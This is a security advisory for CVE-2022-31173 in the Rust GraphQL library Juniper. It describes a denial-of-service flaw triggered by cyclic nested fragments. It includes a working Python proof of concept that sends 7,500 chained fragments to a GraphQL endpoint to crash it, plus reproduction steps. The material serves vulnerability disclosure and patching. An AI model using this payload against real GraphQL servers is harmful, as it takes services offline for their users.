# [H] Juniper is vulnerable to @DOS GraphQL Nested Fragments overflow

## Summary
Severity: High
Advisory: GHSA-4rx6-g5vg-5f3j
CVE: CVE-2022-31173
CWE: CWE-400, CWE-674
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-07-29
Source: https://github.com/advisories/GHSA-4rx6-g5vg-5f3j
Type: github-advisory

## Affected
- crates.io: `juniper` — affected >=0 <0.15.10

## Details
### GraphQL behaviour

Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.
Some language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.

```graphql
# Infinite loop example
query {
    ...a
}

fragment a on Query {
    ...b
}

fragment b on Query {
    ...a
}
```

### POC TLDR
With max_size being the number of nested fragment generated.
At max_size=7500, it should instantly raise:

![](https://i.imgur.com/wXbUx8l.png)

However, with a lower size, you will overflow the memory after some iterations.

### Reproduction steps (Juniper)

```
git clone https://github.com/graphql-rust/juniper.git
cd juniper
```

Save this POC as poc.py

```python
import requests
import time
import json
from itertools import permutations

print('=== Fragments POC ===')

url = 'http://localhost:8080/graphql'

max_size = 7500
perms = [''.join(p) for p in permutations('abcefghijk')]
perms = perms[:max_size]

fragment_payloads = ''
for i, perm in enumerate(perms):
    next_perm = perms[i+1] if i < max_size-1 else perms[0]
    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'

payload = {'query':'query{\n  ...' + perms[0] + '\n}' + fragment_payloads,'variables':{},'operationName':None}

headers = {
  'Content-Type': 'application/json',
}

try:
    response = requests.request('POST', url, headers=headers, json=payload)
    print(response.text)
except requests.exceptions.ConnectionError:
    print('Connection closed, POC worked.')
```

```
cargo run
[in separate shell] python3 poc.py
```

### Credits

[@Escape-Technologies](https://escape.tech)

@c3b5aw 
@MdotTIM 
@karimhreda

## References
- https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j
- https://nvd.nist.gov/vuln/detail/CVE-2022-31173
- https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb
- https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22
- https://github.com/graphql-rust/juniper
- https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28
- https://rustsec.org/advisories/RUSTSEC-2022-0038.html
